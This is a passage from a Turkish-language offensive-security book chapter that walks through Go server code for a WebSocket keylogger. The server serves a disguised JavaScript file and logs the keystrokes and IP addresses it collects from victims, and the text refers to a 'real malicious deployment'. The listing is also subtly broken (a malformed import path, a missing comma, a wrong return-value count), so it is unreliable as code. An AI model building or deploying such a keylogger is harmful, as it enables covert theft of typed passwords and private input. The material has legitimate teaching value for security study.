94   bölüm 4

geçerli bağlam. Bu kaynak, şablona ileteceğiniz bir string’e bağlı olarak sunucunun konum (location) bilgisini dolduracak bir WebSocket URL’sini temsil eder. Buna birazdan geleceğiz. Bu örnek için, JavaScript’i `logger.js` adlı bir dosyaya kaydedeceksiniz.

“Ama bir dakika,” diyorsunuz, “onu `k.js` olarak servis edeceğiz demiştik!” Daha önce gösterdiğimiz HTML de açıkça `k.js` kullanıyordu. Bu ne iş? Aslında `logger.js` bir Go template, gerçek bir JavaScript dosyası değil. Router’ınızda eşleştirme yapmak için `k.js` desenini kullanacaksınız. Bu desen eşleştiğinde, sunucunuz `logger.js` dosyasında saklanan template’i, WebSocket’in bağlandığı host’u temsil eden bağlamsal verilerle birlikte render edecektir. Bunun nasıl çalıştığını, Liste 4-9’da gösterilen sunucu koduna bakarak görebilirsiniz.

```go
import (
   "flag"
   "fmt"
   "html/template"
   "log"
   "net/http"

    "github.com/gorilla/mux"
    "github.com/gorilla/websocket "
)

var (
    upgrader = websocket.Upgrader{
        CheckOrigin: func(r *http.Request) bool { return true }
    }

    listenAddr string
    wsAddr     string
    jsTemplate *template.Template
)

func init() {
   flag.StringVar(&listenAddr, "listen-addr", "", "Address to listen on")
   flag.StringVar(&wsAddr, "ws-addr", "", "Address for WebSocket connection")
   flag.Parse()
   var err error
   jsTemplate, err = template.ParseFiles("logger.js")
   if err != nil {
        panic(err)
   }
}

func serveWS(w http.ResponseWriter, r *http.Request) {
    conn, err := upgrader.Upgrade(w, r, nil)
    if err != nil {
        http.Error(w, "", 500)
        return
    }

    defer conn.Close()
    fmt.Printf("Connection from %s\n", conn.RemoteAddr().String())

    for {
        msg, err := conn.ReadMessage()
        if err != nil {
            return
        }

        fmt.Printf("From %s: %s\n", conn.RemoteAddr().String(), string(msg))
    }
}

func serveFile(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/javascript")
    jsTemplate.Execute(w, wsAddr)
}

func main() {
    r := mux.NewRouter()
    r.HandleFunc("/ws", serveWS)
    r.HandleFunc("/k.js", serveFile)
    log.Fatal(http.ListenAndServe(":8080", r))
}
```

Liste 4-9: Tuş kaydedici (keylogger) sunucusu (`ch-4/websocket_keylogger/main.go`)

Burada ele almamız gereken çok şey var. Öncelikle, WebSocket haberleşmesini yönetmek için başka bir üçüncü parti paket olan `gorilla/websocket` kullandığınıza dikkat edin. Bu, tıpkı bu bölümde daha önce kullandığınız `gorilla/mux` router’ı gibi geliştirme sürecinizi basitleştiren, tam özellikli ve güçlü bir pakettir. Terminalinizde `go get github.com/gorilla/websocket` komutunu çalıştırmayı unutmayın.

Sonrasında birkaç değişken tanımlıyorsunuz. Her origin’i (kaynak) beyaz listeye alacak (whitelist) bir `websocket.Upgrader` örneği (instance) oluşturuyorsunuz. Tüm origin’lere izin vermek tipik olarak kötü bir güvenlik pratiğidir, ancak bu durumda yerel iş istasyonlarımızda çalıştıracağımız bir test örneği olduğu için bunu kabul ediyoruz. Gerçek bir kötü amaçlı dağıtımda (deployment) kullanmak için muhtemelen origin’i açıkça belirtilmiş bir değere sınırlamak istersiniz.

Otomatik olarak `main()`’den önce çalışan `init()` fonksiyonunuz içinde, komut satırı argümanlarını tanımlıyor ve `logger.js` dosyasında saklanan Go template’ini ayrıştırmaya (parse etmeye) çalışıyorsunuz. `template.ParseFiles("logger.js")` fonksiyonunu çağırdığınıza dikkat edin. Dosyanın doğru şekilde ayrıştırıldığından emin olmak için dönüş değerini kontrol ediyorsunuz. Her şey başarılı olursa, ayrıştırılmış template’iniz `jsTemplate` adlı bir değişkende saklanmış olur.

Bu noktada henüz template’e hiçbir bağlamsal veri sağlamadınız veya onu çalıştırmadınız. Bu birazdan olacak. Önce, WebSocket haberleşmesini yönetmek için kullanacağınız `serveWS()` adlı bir fonksiyon tanımlıyorsunuz. `upgrader.Upgrade(http.ResponseWriter, *http.Request, http.Header)` çağrısı yaparak yeni bir `websocket.Conn` örneği oluşturuyorsunuz. `Upgrade()` metodu HTTP bağlantısını WebSocket protokolünü kullanacak şekilde yükseltir (upgrade eder). Bu da, bu fonksiyon tarafından ele alınan herhangi bir isteğin WebSocket kullanacak şekilde yükseltileceği anlamına gelir. Bağlantıyla, gelen mesajları okumak için `conn.ReadMessage()` çağrısı yaptığınız sonsuz bir `for` döngüsü içinde etkileşime giriyorsunuz. JavaScript’iniz düzgün çalışıyorsa, bu mesajlar yakalanan tuş vuruşlarından (keystrokes) oluşmalıdır. Bu mesajları ve istemcinin uzak IP adresini `stdout`’a yazıyorsunuz.
